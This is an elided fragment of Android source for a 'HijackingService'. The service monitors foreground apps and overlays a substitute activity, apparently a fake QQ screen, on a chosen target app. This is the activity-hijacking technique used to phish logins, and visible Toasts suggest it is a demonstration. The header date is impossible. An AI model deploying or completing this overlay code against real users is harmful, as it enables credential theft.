...
/**
 * Created by abigbread on 2020/50/10 0030.
 *
 * 劫持服务
 */
...
public class HijackingService extends Service {
    ...
    public void onStart(Intent intent, int startId) {
        ...
        String app_name = (String) MySharedPreferences.getName(HijackingService.this);
        Toast.makeText(HijackingService.this, "正在劫持"+app_name, Toast.LENGTH_SHORT).show();
        if (!hasStart){
            //添加想要劫持的应用
            classStores.put(app_name, QQActivity.class);
            handler.postDelayed(mTask, 1000);
            ...
            for (AndroidAppProcess androidAppProcess : runningForegroundApps){
                ...
                if (!HijackingApplication.hasProgressBeHijacked(packageStr)){
                    ...
                    if (classStores.containsKey(packageStr)){
                        ...
                        Toast.makeText(HijackingService.this, "已经劫持"+packageStr, Toast.LENGTH_SHORT).show();
